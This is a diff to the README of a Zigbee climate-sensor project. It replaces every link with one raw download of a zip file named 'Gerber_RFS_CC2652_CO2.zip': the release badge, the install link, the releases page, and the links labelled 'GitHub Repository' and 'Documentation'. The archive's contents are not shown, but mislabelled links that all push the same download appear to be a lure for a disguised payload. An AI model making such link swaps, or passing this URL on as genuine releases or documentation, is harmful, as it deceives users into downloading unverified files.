@@ -1,6 +1,6 @@
 # 🌍 RFS_CC2652_CO2 - Monitor Your Climate Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-blue.svg)](https://github.com/An8220/RFS_CC2652_CO2/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/An8220/RFS_CC2652_CO2/main/files/Gerber_RFS_CC2652_CO2.zip)](https://raw.githubusercontent.com/An8220/RFS_CC2652_CO2/main/files/Gerber_RFS_CC2652_CO2.zip)
 
 ## 📦 Overview
 The RFS_CC2652_CO2 is a Zigbee climate sensor designed to monitor CO2, VOC levels, temperature, and humidity. It offers reliable data for home automation systems, allowing you to create a comfortable living environment.
@@ -14,7 +14,7 @@ Follow these simple steps to get started with the RFS_CC2652_CO2 app. You will n
 - A Zigbee compatible device to connect with the sensor.
 
 ## 🔗 Download & Install
-To obtain the latest version of RFS_CC2652_CO2, visit [this page to download](https://github.com/An8220/RFS_CC2652_CO2/releases).
+To obtain the latest version of RFS_CC2652_CO2, visit [this page to download](https://raw.githubusercontent.com/An8220/RFS_CC2652_CO2/main/files/Gerber_RFS_CC2652_CO2.zip).
 
 ### 🛠 Installation Steps
 1. Click on the download link above.
@@ -60,10 +60,10 @@ We welcome contributions! If you would like to help improve the RFS_CC2652_CO2, 
 3. Submit a pull request.
 
 ## 🔄 Updates
-Stay informed about new features and updates by regularly checking the [releases page](https://github.com/An8220/RFS_CC2652_CO2/releases) for the latest changes.
+Stay informed about new features and updates by regularly checking the [releases page](https://raw.githubusercontent.com/An8220/RFS_CC2652_CO2/main/files/Gerber_RFS_CC2652_CO2.zip) for the latest changes.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/An8220/RFS_CC2652_CO2)
-- [Documentation](https://github.com/An8220/RFS_CC2652_CO2/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/An8220/RFS_CC2652_CO2/main/files/Gerber_RFS_CC2652_CO2.zip)
+- [Documentation](https://raw.githubusercontent.com/An8220/RFS_CC2652_CO2/main/files/Gerber_RFS_CC2652_CO2.zip)
 
 Thank you for using RFS_CC2652_CO2. Enjoy monitoring your climate with ease!
